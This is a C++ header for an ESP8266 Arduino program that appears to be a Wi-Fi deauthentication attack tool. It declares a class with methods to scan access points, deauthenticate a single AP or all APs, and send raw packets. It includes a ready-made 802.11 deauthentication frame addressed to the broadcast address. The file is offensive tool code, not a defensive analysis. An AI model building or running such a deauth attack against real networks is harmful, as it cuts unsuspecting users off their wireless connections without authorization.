#ifndef Attack_h
#define Attack_h

#include "Arduino.h"
#include "Command.h"
#include <ESP8266WiFi.h>

extern "C" {
  #include "user_interface.h"
}

extern Command cmd;

struct AP {
  uint8_t* bssid;
  char bssid_c[17];
  char ssid[32];
  int32_t rssi;
  uint8_t channel;
};

class Attack {
  public:
    Attack();
    void attackAPs(char* aps);
    void deauthAP(uint8_t* apMac);
    void deauthAll();
    int sendPacket(uint8_t* packet, uint16_t packetSize);
    void scan();
    void setChannel(uint8_t ch);
    void logAttack(int num);
    void updateAttack();
    void start();
    void stop();
    void sendAPs(WiFiClient client);
    uint8_t mode = 0x00;
  private:
    uint8_t DEAUTH = 0x01;
    uint8_t DEAUTHALL = 0x02;
    int devices[32];
    int devices_c = -1;
    int success_times = 0;
    int target = -1;
    uint8_t wifi_channel;
    long attack_time = 0;
    long pcktTime = 0;
    bool attack_running = false;
    bool run_attack = false;
    uint8_t deauthPacket[26] = {
    /*  0 - 1  */ 0xC0, 0x00,                         // type, subtype c0: deauth (a0: disassociate)
    /*  2 - 3  */ 0x00, 0x00,                         // duration (SDK takes care of that)
    /*  4 - 9  */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // reciever (target)
    /* 10 - 15 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // source (ap)
    /* 16 - 21 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // BSSID (ap)
    /* 22 - 23 */ 0x00, 0x00,                         // fragment & squence number
    /* 24 - 25 */ 0x07, 0x00                          // reason code (1 = unspecified reason)
    };
    uint8_t broadcast[6] = { 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF };
    uint16_t packetSize = 0;
    AP APs[32];
};

#endif
